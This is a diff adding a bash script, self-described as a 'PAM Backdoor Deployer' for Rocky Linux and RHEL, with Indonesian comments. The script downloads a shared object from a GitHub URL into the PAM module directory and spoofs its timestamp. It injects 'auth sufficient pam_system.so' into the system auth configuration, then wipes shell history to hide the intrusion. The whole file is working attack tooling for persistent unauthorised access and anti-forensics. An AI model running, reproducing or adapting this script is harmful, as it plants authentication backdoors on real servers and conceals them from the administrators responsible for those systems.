@@ -1,0 +1,151 @@
+#!/bin/bash
+# ============================================================
+# PAM Backdoor Deployer - NO HISTORY + TIMESTAMP SPOOF
+# Rocky Linux 9 / RHEL-based fix
+# ============================================================
+unset HISTFILE
+set +o history
+
+URL="https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/pamca.so"
+PAM_FILE="pam_system.so"
+
+# Tambahin path RHEL/Rocky
+PAM_PATHS=(
+    "/lib/x86_64-linux-gnu/security/"
+    "/lib/security/"
+    "/usr/lib/x86_64-linux-gnu/security/"
+    "/usr/lib/security/"
+    "/usr/lib64/security/"          # <-- rocky/rhel path utama
+    "/lib64/security/"              # <-- fallback rhel
+)
+
+PAM_INSTALL_DIR=""
+for path in "${PAM_PATHS[@]}"; do
+    if [ -d "$path" ]; then
+        PAM_INSTALL_DIR="$path"
+        echo "[+] Found PAM directory: $path"
+        break
+    fi
+done
+
+if [ -z "$PAM_INSTALL_DIR" ]; then
+    echo "[*] PAM directory not found. Detecting package manager..."
+
+    if command -v dnf &>/dev/null; then
+        echo "[*] DNF detected (RHEL/Rocky/Fedora)"
+        dnf install -y pam-devel
+    elif command -v yum &>/dev/null; then
+        echo "[*] YUM detected (CentOS/old RHEL)"
+        yum install -y pam-devel
+    elif command -v apt &>/dev/null; then
+        echo "[*] APT detected (Debian/Ubuntu)"
+        apt install -y libpam0g-dev
+    else
+        echo "[-] No supported package manager found. Exiting."
+        exit 1
+    fi
+
+    for path in "${PAM_PATHS[@]}"; do
+        if [ -d "$path" ]; then
+            PAM_INSTALL_DIR="$path"
+            echo "[+] PAM directory created: $path"
+            break
+        fi
+    done
+fi
+
+if [ -z "$PAM_INSTALL_DIR" ]; then
+    echo "[-] PAM directory still not found. Exiting."
+    exit 1
+fi
+
+# ─── SIMPAN TIMESTAMP REFERENSI ───
+REF_FILE=""
+for f in "$PAM_INSTALL_DIR"*.so; do
+    if [ -f "$f" ] && [ "$f" != "$PAM_INSTALL_DIR$PAM_FILE" ]; then
+        REF_FILE="$f"
+        break
+    fi
+done
+
+if [ -z "$REF_FILE" ]; then
+    for f in /usr/lib64/security/*.so /lib/security/*.so; do
+        if [ -f "$f" ]; then
+            REF_FILE="$f"
+            break
+        fi
+    done 2>/dev/null
+fi
+
+# ─── DOWNLOAD ───
+echo "[*] Downloading pam_system.so..."
+curl -fsSL -o "$PAM_INSTALL_DIR$PAM_FILE" "$URL"
+if [ $? -ne 0 ]; then
+    echo "[-] Download failed!"
+    exit 1
+fi
+echo "[+] Downloaded to: $PAM_INSTALL_DIR$PAM_FILE"
+
+# ─── SPOOF TIMESTAMP ───
+if [ -n "$REF_FILE" ] && [ -f "$REF_FILE" ]; then
+    echo "[*] Spoofing timestamp from: $REF_FILE"
+    touch -r "$REF_FILE" "$PAM_INSTALL_DIR$PAM_FILE"
+    echo "[+] Timestamp synchronized"
+else
+    # Rocky: fallback ke system-auth bukan common-auth
+    for ref in "/etc/pam.d/system-auth" "/etc/pam.d/common-auth" "/etc/pam.d/password-auth"; do
+        if [ -f "$ref" ]; then
+            touch -r "$ref" "$PAM_INSTALL_DIR$PAM_FILE"
+            echo "[+] Timestamp from $ref"
+            break
+        fi
+    done
+fi
+
+chmod 644 "$PAM_INSTALL_DIR$PAM_FILE"
+echo "[+] Permission set to 644"
+
+# ─── INJEKSI ───
+# Rocky pakai system-auth + password-auth, bukan common-auth
+AUTH_FILE=""
+for candidate in \
+    "/etc/pam.d/common-auth" \
+    "/etc/pam.d/system-auth" \
+    "/etc/pam.d/password-auth"; do
+    if [ -f "$candidate" ]; then
+        AUTH_FILE="$candidate"
+        break
+    fi
+done
+
+if [ -z "$AUTH_FILE" ]; then
+    echo "[-] No PAM auth file found!"
+    exit 1
+fi
+
+echo "[*] Injecting into $AUTH_FILE..."
+
+if [ -f "$AUTH_FILE" ]; then
+    touch -r "$AUTH_FILE" "$AUTH_FILE.timestamp.ref"
+fi
+
+if grep -q "pam_system.so" "$AUTH_FILE"; then
+    echo "[!] pam_system.so already exists in $AUTH_FILE"
+else
+    cp "$AUTH_FILE" "$AUTH_FILE.bak"
+    echo "auth sufficient pam_system.so" | cat - "$AUTH_FILE" > /tmp/auth.tmp
+    mv /tmp/auth.tmp "$AUTH_FILE"
+    echo "[+] Injected: auth sufficient pam_system.so into $AUTH_FILE"
+
+    if [ -f "$AUTH_FILE.timestamp.ref" ]; then
+        touch -r "$AUTH_FILE.timestamp.ref" "$AUTH_FILE"
+        rm -f "$AUTH_FILE.timestamp.ref"
+        echo "[+] Auth file timestamp restored"
+    fi
+fi
+
+# ─── CLEAN ───
+rm -f ~/.bash_history ~/.history 2>/dev/null
+history -c 2>/dev/null
+clear
+echo "[+] DONE Ganteng Mr.W4W4N | GHOST HAXOR!"
